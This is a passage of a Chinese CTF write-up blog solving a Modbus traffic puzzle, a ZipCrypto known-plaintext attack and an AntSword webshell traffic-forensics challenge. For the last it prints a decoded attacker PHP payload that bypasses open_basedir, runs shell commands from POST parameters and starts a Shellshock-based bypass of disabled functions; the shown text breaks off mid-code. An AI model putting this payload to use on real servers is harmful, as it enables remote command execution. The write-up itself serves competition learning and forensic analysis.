</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r modbus.pcapng -T fields -Y <span class=s1>&#39;(modbus.func_code != 3) &amp;&amp; (ip.src == 192.168.142.152)&#39;</span> -e modbus.regval_uint16 &gt; 1.txt</span></span></code></pre></td></tr></table></div></div><p>提取出来后，可以得到一张 PNG 图片，并且 PNG 图片末尾还有一个加密的 zip 压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009161028218.png alt=/posts/bb1da35/imgs/image-20251009161028218.png height=1754 width=2798></p><p>提取出来的 PNG 显示可能有点问题，但是 IDAT 块都是正常的</p><p>因此我们可以手动补上 PNG 文件头，然后爆破一下图片的宽高即可</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009161224647.png alt=/posts/bb1da35/imgs/image-20251009161224647.png height=1784 width=2804></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009161159365.png alt=/posts/bb1da35/imgs/image-20251009161159365.png height=974 width=2022></p><p>上面这张是工控里的梯形图，我们可以看到里面有 pass 和 key 两个输出，计算一下可以得到：</p><p>key：2020304249</p><p>pass：1184485120</p><p>把 pass 作为解压密码解压 zip 可以得到 flag.txt，其中内容如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>VQsCVg0EBAEODQIKAVYHUVIABg4FBgoDDVIFBQEPBgA=</span></span></code></pre></td></tr></table></div></div><p>然后把 key 转 bytes 可以得到一个<code>xkey</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=mi>2020304249</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;xkey&#39;</span></span></span></code></pre></td></tr></table></div></div><p>但是不知道怎么用这个 <code>xkey</code> 和上面 base64 编码后的密文得到最后的 flag</p><h2 class=heading-element id=题目名称-kobetea><span>题目名称 KobeTea</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-kobetea class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题面信息如下：</p><blockquote><p>孩子们想喝KobeTea吗，快解开这个压缩包，救出困在里面的牢大吧? 别白费劲了，力大如牢大都无法肘开，注意观察直升机的制作方法吧! 提示：分支是main</p></blockquote><p>附件给了一个压缩包，发现是ZipCrypto+Store，明显提示了我们需要明文攻击</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251117194049283.png alt=/posts/bb1da35/imgs/image-20251117194049283.png height=516 width=2018></p><p>并且发现里面有个.git的目录可以利用</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251117194136986.png alt=/posts/bb1da35/imgs/image-20251117194136986.png height=858 width=2248></p><p>可以去随便找个项目，把里面.git目录中的文件拿出来压缩一下，然后比较一下CRC</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251117194228185.png alt=/posts/bb1da35/imgs/image-20251117194228185.png height=380 width=2244></p><p>发现CRC能对上，因此我们就可以开始明文攻击了</p><p>这种带目录结构的我个人比较喜欢直接用下面这个软件攻击</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251117194459370.png alt=/posts/bb1da35/imgs/image-20251117194459370.png height=908 width=922></p><p>用上面的密码解压后用vscode打开，选一下分支即可得到flag：<code>flag{0ne_bo77le_o1ny_n3ed_4_Yu@n}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251117194644395.png alt=/posts/bb1da35/imgs/image-20251117194644395.png height=1128 width=1732></p><h2 class=heading-element id=题目名称-yijian霜寒十四州2025-全国大学生信息安全竞赛-新疆赛区><span>题目名称 yijian霜寒十四州（2025 全国大学生信息安全竞赛 新疆赛区）</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-yijian%e9%9c%9c%e5%af%92%e5%8d%81%e5%9b%9b%e5%b7%9e2025-%e5%85%a8%e5%9b%bd%e5%a4%a7%e5%ad%a6%e7%94%9f%e4%bf%a1%e6%81%af%e5%ae%89%e5%85%a8%e7%ab%9e%e8%b5%9b-%e6%96%b0%e7%96%86%e8%b5%9b%e5%8c%ba class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一个流量包，打开看一下流量的特征，发现是蚁剑流量</p><p>根据响应的格式，很容易知道这个马用的是 ROT13 的编码器</p><p>我们追踪 HTTP 流到 HTTP 流84</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209153622659.png alt=/posts/bb1da35/imgs/image-20251209153622659.png height=1836 width=2804></p><p>CyberChef 解码一下可以得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This trip left some content that uses the same encoder as the Trojan horse,BUDBCYAwEJso0OZyzTyVen7cQNz9qHc/33SGdd1QyqhVC2QQU8dJnRg7/wY=</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209153917898.png alt=/posts/bb1da35/imgs/image-20251209153917898.png height=1670 width=2798></p><p>提示了我们用的是和木马一样的编码器，因此我们回头去找那个木马</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209154112128.png alt=/posts/bb1da35/imgs/image-20251209154112128.png height=1836 width=2804></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209154149818.png alt=/posts/bb1da35/imgs/image-20251209154149818.png height=1068 width=2790></p><p>发现这个木马的编码器是先 base64 解码然后 inflate 解压了</p><p>因此我们直接用这个脚本解一下之前得到的 base64 即可得到 flag</p><p><code>flag{175374be-4547-f6f6-2232-14d7524d30a5}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;BUDBCYAwEJso0OZyzTyVen7cQNz9qHc/33SGdd1QyqhVC2QQU8dJnRg7/wY=&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=o>@</span><span class=nx>gzinflate</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=c1>//flag{175374be-4547-f6f6-2232-14d7524d30a5}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>当然也可以直接用 CyberChef 解码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209155304085.png alt=/posts/bb1da35/imgs/image-20251209155304085.png height=1102 width=2466></p><p>这道题到这里其实也就结束了，但是我这里还是理一下这个马的完整逻辑吧</p><p>首先就是攻击者在 HTTP 流 43 中上传了一个木马</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209155018283.png alt=/posts/bb1da35/imgs/image-20251209155018283.png height=1836 width=2804></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209154904164.png alt=/posts/bb1da35/imgs/image-20251209154904164.png height=1096 width=2796></p><p>我们可以看到这个马的参数是从 hope 变量中获取的，然后解 base64 以及 inflate 解压</p><p>因此我们来看一下后续请求中 hope 变量中的值，这里就拿 HTTP 流 84 为例</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209155134019.png alt=/posts/bb1da35/imgs/image-20251209155134019.png height=1836 width=2804></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209155219257.png alt=/posts/bb1da35/imgs/image-20251209155219257.png height=1674 width=2798></p><p>稍微处理一下就可以得到 hope 变量中的值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6gwNk40t0yzTLUwSk4yjdXU1LQGAA==</span></span></code></pre></td></tr></table></div></div><p>按照之前木马的逻辑，我们解码一下 hope 变量</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209155555772.png alt=/posts/bb1da35/imgs/image-20251209155555772.png height=1166 width=2796></p><p>可以看到这里又套了一层，参数需要去 <code>_0x33a79f9e82cb5</code> 变量中获取</p><p>因此我们提取并解码一下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209155702789.png alt=/posts/bb1da35/imgs/image-20251209155702789.png height=1670 width=2792></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$opdir</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ini_get</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$opdir</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ocwd</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$oparr</span> <span class=o>=</span> <span class=nx>preg_split</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Lzt8Oi8=&#34;</span><span class=p>),</span> <span class=nv>$opdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>array_push</span><span class=p>(</span><span class=nv>$oparr</span><span class=p>,</span> <span class=nv>$ocwd</span><span class=p>,</span> <span class=nx>sys_get_temp_dir</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$oparr</span> <span class=k>as</span> <span class=nv>$item</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>is_writable</span><span class=p>(</span><span class=nv>$item</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nv>$item</span> <span class=o>.</span> <span class=s2>&#34;/.9315a2db7e5d&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nx>realpath</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cntarr</span> <span class=o>=</span> <span class=o>@</span><span class=nx>preg_split</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\\\</span><span class=s2>|\//&#34;</span><span class=p>,</span> <span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$cntarr</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>rmdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>};;</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>asenc</span><span class=p>(</span><span class=nv>$out</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$out</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>asoutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$output</span> <span class=o>=</span> <span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;80&#34;</span> <span class=o>.</span> <span class=s2>&#34;324&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=o>@</span><span class=nx>asenc</span><span class=p>(</span><span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;5a9&#34;</span> <span class=o>.</span> <span class=s2>&#34;ae81&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$p</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;nd940e9a247057&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;ca662241d33bb8&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$envstr</span> <span class=o>=</span> <span class=o>@</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;uf4fe7e98c2272&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$d</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span> <span class=o>?</span> <span class=s2>&#34;-c </span><span class=se>\&#34;</span><span class=si>{</span><span class=nv>$s</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=s2>&#34;/c </span><span class=se>\&#34;</span><span class=si>{</span><span class=nv>$s</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;PATH=&#34;</span> <span class=o>.</span> <span class=nx>getenv</span><span class=p>(</span><span class=s2>&#34;PATH&#34;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;PATH=&#34;</span> <span class=o>.</span> <span class=nx>getenv</span><span class=p>(</span><span class=s2>&#34;PATH&#34;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$envstr</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$envarr</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;|||asline|||&#34;</span><span class=p>,</span> <span class=nv>$envstr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$envarr</span> <span class=k>as</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$v</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>putenv</span><span class=p>(</span><span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;|||askey|||&#34;</span><span class=p>,</span> <span class=s2>&#34;=&#34;</span><span class=p>,</span> <span class=nv>$v</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$r</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{</span><span class=nv>$p</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=nv>$c</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>fe</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$d</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>,</span> <span class=o>@</span><span class=nx>ini_get</span><span class=p>(</span><span class=s2>&#34;disable_functions&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$d</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$d</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$d</span> <span class=o>=</span> <span class=nx>array_map</span><span class=p>(</span><span class=s1>&#39;trim&#39;</span><span class=p>,</span> <span class=nx>array_map</span><span class=p>(</span><span class=s1>&#39;strtolower&#39;</span><span class=p>,</span> <span class=nv>$d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>is_callable</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=nv>$d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>runshellshock</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=nv>$c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span> <span class=o>&amp;&amp;</span> <span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;putenv&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;error_log&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;mail&#39;</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>strstr</span><span class=p>(</span><span class=nx>readlink</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>),</span> <span class=s2>&#34;bash&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=k>FALSE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$tmp</span> <span class=o>=</span> <span class=nx>tempnam</span><span class=p>(</span><span class=nx>sys_get_temp_dir</span><span class=p>(),</span> <span class=s1>&#39;as&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;PHP_LOL=() { x; }; </span><span class=si>$c</span><span class=s2> &gt;</span><span class=si>$tmp</span><span class=s2> 2&gt;&amp;1&#34;</span><span class=p>);</span>
